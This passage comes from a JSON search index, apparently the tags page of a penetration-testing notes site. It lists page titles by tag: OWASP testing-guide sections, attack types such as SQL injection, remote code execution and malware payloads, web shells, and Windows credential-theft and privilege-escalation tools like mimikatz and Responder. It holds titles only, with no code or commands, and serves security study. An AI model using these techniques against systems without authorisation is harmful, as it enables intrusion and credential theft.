Guide</li> <li>Enumerate Infrastructure and Application Admin Interfaces - OWASP Web Security Testing Guide</li> <li>Test HTTP Methods - OWASP Web Security Testing Guide</li> <li>Test HTTP Strict Transport Security - OWASP Web Security Testing Guide</li> <li>Test RIA Cross Domain Policy - OWASP Web Security Testing Guide</li> <li>Test File Permission - OWASP Web Security Testing Guide</li> <li>Test for Subdomain Takeover - OWASP Web Security Testing Guide</li> <li>Test Cloud Storage - OWASP Web Security Testing Guide</li> <li>Testing for Content Security Policy - OWASP Web Security Testing Guide</li> <li>Test Path Confusion - OWASP Web Security Testing Guide</li> <li>Testing for Weak Transport Layer Security - OWASP Web Security Testing Guide</li> <li>Testing for Padding Oracle - OWASP Web Security Testing Guide</li> <li>Testing for Sensitive Information Sent via Unencrypted Channels - OWASP Web Security Testing Guide</li> <li>Testing for Weak Encryption - OWASP Web Security Testing Guide</li> <li>Testing for Improper Error Handling - OWASP Web Security Testing Guide</li> <li>Testing for Stack Traces - OWASP Web Security Testing Guide</li> <li>Test Role Definitions - OWASP Web Security Testing Guide</li> <li>Test User Registration Process - OWASP Web Security Testing Guide</li> <li>Test Account Provisioning Process - OWASP Web Security Testing Guide</li> <li>Testing for Account Enumeration and Guessable User Account - OWASP Web Security Testing Guide</li> <li>Testing for Weak or Unenforced Username Policy - OWASP Web Security Testing Guide</li> <li>Conduct search engine discovery reconnaissance for information leakage - OWASP Web Security Testing Guide</li> <li>Fingerprint Web Server - OWASP Web Security Testing Guide</li> <li>Testing for Reflected Cross Site Scripting - OWASP Web Security Testing Guide</li> <li>Testing for Stored Cross Site Scripting - OWASP Web Security Testing Guide</li> <li>Testing for HTTP Verb Tampering - OWASP Web Security Testing Guide</li> <li>Testing for HTTP Parameter Pollution - OWASP Web Security Testing Guide</li> <li>Testing for SQL Injection - OWASP Web Security Testing Guide</li> <li>Testing for LDAP Injection - OWASP Web Security Testing Guide</li> <li>Testing for XML Injection - OWASP Web Security Testing Guide</li> <li>Testing for SSI Injection - OWASP Web Security Testing Guide</li> <li>Testing for XPath Injection - OWASP Web Security Testing Guide</li> <li>Testing for IMAP SMTP Injection - OWASP Web Security Testing Guide</li> <li>Testing for Code Injection - OWASP Web Security Testing Guide</li> <li>Testing for Command Injection - OWASP Web Security Testing Guide</li> <li>Testing for Format String Injection - OWASP Web Security Testing Guide</li> <li>Testing for Incubated Vulnerability - OWASP Web Security Testing Guide</li> <li>Testing for HTTP Splitting Smuggling - OWASP Web Security Testing Guide</li> <li>Testing for HTTP Incoming Requests - OWASP Web Security Testing Guide</li> <li>Testing for Host Header Injection - OWASP Web Security Testing Guide</li> <li>Testing for Server-side Template Injection - OWASP Web Security Testing Guide</li> <li>Testing for Server-Side Request Forgery - OWASP Web Security Testing Guide</li> <li>Testing for Mass Assignment - OWASP Web Security Testing Guide</li> <li>Testing for Session Management Schema - OWASP Web Security Testing Guide</li> <li>Testing for Cookies Attributes - OWASP Web Security Testing Guide</li> <li>Testing for Session Fixation - OWASP Web Security Testing Guide</li> <li>Testing for Exposed Session Variables - OWASP Web Security Testing Guide</li> <li>Testing for Cross Site Request Forgery - OWASP Web Security Testing Guide</li> <li>Testing for Logout Functionality - OWASP Web Security Testing Guide</li> <li>Testing Session Timeout - OWASP Web Security Testing Guide</li> <li>Testing for Session Puzzling - OWASP Web Security Testing Guide</li> <li>Testing for Session Hijacking - OWASP Web Security Testing Guide</li> <li>Testing JSON Web Tokens - OWASP Web Security Testing Guide</li> <li>Broken access control</li> <li>Buffer Overflow attack</li> <li>Captcha Replay attack</li> <li>Carriage Return and Linefeed - CRLF Attack</li> <li>XFS attack - Cross-frame Scripting</li> <li>XSS attack - Cross-Site Scripting</li> <li>Directory Traversal attack</li> <li>LFI attack - Local File Inclusion</li> <li>Creating malware and custom payloads</li> <li>PHP Type Juggling Vulnerabilities</li> <li>RFD attack - Reflected File Download</li> <li>RCE attack - Remote Code Execution</li> <li>RFI attack - Remote File Inclusion</li> <li>SSRF attack - Server Side Request Forgery</li> <li>Server-side Template Injection - SSTI</li> <li>Session Puzzling - Session Variable Overloading</li> <li>SQL injection</li> </ul>","tags":["tags"]},{"location":"tags/#web-server","title":"web server","text":"<ul> <li>httprint - A web server fingerprinting tool</li> </ul>","tags":["tags"]},{"location":"tags/#web-shells","title":"web shells","text":"<ul> <li>Laudanum - Injectable Web Exploit Code</li> </ul>","tags":["tags"]},{"location":"tags/#webpentesting","title":"webpentesting","text":"<ul> <li>Pentesting oDAta</li> <li>Phpggc - A tool for PHP deserialization</li> <li>Ysoserial - A tool for Java deserialization</li> </ul>","tags":["tags"]},{"location":"tags/#webservices","title":"webservices","text":"<ul> <li>Pentesting web services</li> </ul>","tags":["tags"]},{"location":"tags/#webshell","title":"webshell","text":"<ul> <li>Web Shells</li> <li>WhiteWinterWolf php webshell</li> </ul>","tags":["tags"]},{"location":"tags/#windows","title":"windows","text":"<ul> <li>Port 389 - 636 LDAP</li> <li>Privilege escalation in Active Directory from Windows</li> <li>Active Directory</li> <li>The ActiveDirectory PowerShell module</li> <li>Arp poisoning</li> <li>arpspoof from dniff</li> <li>BloodHound</li> <li>CFF explorer</li> <li>CrackMapExec</li> <li>Crowbar</li> <li>DomainPasswordSpray</li> <li>CFF explorer</li> <li>enum</li> <li>enum4linux</li> <li>Markup - A HackTheBox machine</li> <li>Tactics - A HackTheBox machine</li> <li>hydra</li> <li>SMBExec - a module from Impacket</li> <li>Impacket - A python tool for network protocols</li> <li>Index for Windows Privilege Escalation</li> <li>Inveigh</li> <li>Invoke-TheHash</li> <li>Kerberos Authentication</li> <li>Kerbrute</li> <li>LDAP - Active Directory</li> <li>medusa</li> <li>mimikatz</li> <li>mitm_relay Suite</li> <li>Microsoft Management Console (MMC)</li> <li>NetBIOS - Network Basic Input Output System</li> <li>NT Authority System</li> <li>Pass The Hash</li> <li>PowerUp.ps1</li> <li>Powerview.ps1</li> <li>pyftpdlib - A ftp server written in python</li> <li>pypykatz</li> <li>rdesktop</li> <li>Responder.py - A SMB server to listen to NTLM hashes</li> <li>SharpView</li> <li>SirepRAT - RCE as SYSTEM on Windows IoT Core</li> <li>Snaffler - a tool for enumerating creds and shares in Active Directory</li> <li>SysInternals Suite</li> <li>Transferring files techniques - Windows</li> <li>Virtualbox and Extension Pack</li> <li>WebDav- WsgiDAV - A generic and extendable WebDAV server</li> <li>Window Detective - A tool to view windows properties in the system</li> <li>Windows binaries -  LOLBAS</li> <li>Windows credentials storage</li> <li>Footprinting Windows</li> <li>Recently accessed files and executed commands</li> <li>winPEAS - Windows Privilege Escalation Awesome Scripts</li> <li>winspy - A tool to view windows properties in the system</li> <li>xfreerdp</li> <li>HTTP Authentication Schemes</li> </ul>","tags":["tags"]},{"location":"tags/#windows-pentesting","title":"windows pentesting","text":"<ul> <li>JAWS - Just Another Windows (Enum) Script</li> <li>Seatbelt - A tool to scan Windows system</li> </ul>","tags":["tags"]},{"location":"tags/#windows-privilege-escalation","title":"windows privilege escalation","text":"<ul> <li>Privilege escalation - Weak service file permission</li> </ul>","tags":["tags"]},{"location":"tags/#windows-remote-management","title":"windows remote management","text":"<ul> <li>evil-winrm</li> </ul>","tags":["tags"]},{"location":"tags/#winrm","title":"winrm","text":"<ul> <li>Port 5985, 5986 - Windows Remote Management (WinRM)</li> </ul>","tags":["tags"]},{"location":"tags/#wireshark","title":"wireshark","text":"<ul> <li>Information gathering phase - Thick client Applications</li> <li>Traffic analysis - Thick client Applications</li> </ul>","tags":["tags"]},{"location":"tags/#wmi","title":"wmi","text":"<ul> <li>Port 135 - Windows Management Instrumentation (<code>WMI</code>)</li> </ul>","tags":["tags"]},{"location":"tags/#wordpress","title":"wordpress","text":"<ul> <li>Pentesting Keycloak</li> <li>pentesting wordpress</li> <li>wpscan - Wordpress Security Scanner</li> </ul>","tags":["tags"]},{"location":"tags/#xor-encryption","title":"xor encryption","text":"<ul> <li>Bypassing IPS with handmade XOR Encryption</li> </ul>","tags":["tags"]},{"location":"tags/#xss","title":"xss","text":"<ul> <li>BurpSuite Labs - Cross-site Scripting</li> <li>XSS attack - Cross-Site Scripting</li> </ul>","tags":["tags"]},{"location":"tags/#xxe","title":"xxe","text":"<ul> <li>Markup - A HackTheBox machine</li> <li>XXE - XEE XML External Entity attack</li> </ul>","tags":["tags"]}]}